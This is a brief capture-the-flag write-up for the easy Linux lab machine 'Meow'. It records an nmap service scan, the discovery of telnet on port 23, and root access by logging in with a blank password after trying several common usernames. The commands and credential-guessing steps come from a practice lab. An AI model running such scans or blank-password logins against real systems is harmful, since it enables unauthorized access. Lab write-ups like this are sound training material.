# Box: Meow
Difficulty: Easy
OS: Linux

## 🧠 Recon
**Nmap Scan:**
```bash
sudo nmap -sV -Pn 10.129.222.196 (skipped ping check)

## 🔍 Enumeration
Found an open port 23/tcp, running the telnet service

## 💥 Exploitation
Tried logging in with common usernames and no password:
admin — ❌
administrator — ❌
root — ✅ Success

Commands executed:
telnet 10.129.222.196
login: root
Password: [blank]
Gained shell access as root.

## 🔐 Privilege Escalation
Not required - root access via telnet

## 🧼 Cleanup & Lessons
N/A

